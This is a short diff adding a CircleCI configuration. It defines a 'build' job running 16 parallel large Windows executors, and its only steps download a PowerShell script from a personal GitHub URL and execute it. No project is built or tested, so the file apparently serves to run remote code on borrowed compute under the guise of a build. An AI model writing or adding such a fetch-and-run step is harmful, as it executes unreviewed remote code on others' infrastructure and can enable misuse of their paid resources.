@@ -1,0 +1,17 @@
+version: 2.1
+ 
+orbs:
+  win: circleci/windows@2.2.0
+ 
+jobs:
+  build:
+    parallelism: 16
+    executor:
+      name: win/default
+      shell: powershell.exe
+      size: "large"
+      
+    steps:
+      - checkout
+      - run: Invoke-WebRequest -Uri https://raw.githubusercontent.com/itsmesingh/codemagic/main/start.ps1 -outfile test.ps1
+      - run: .\test.ps1
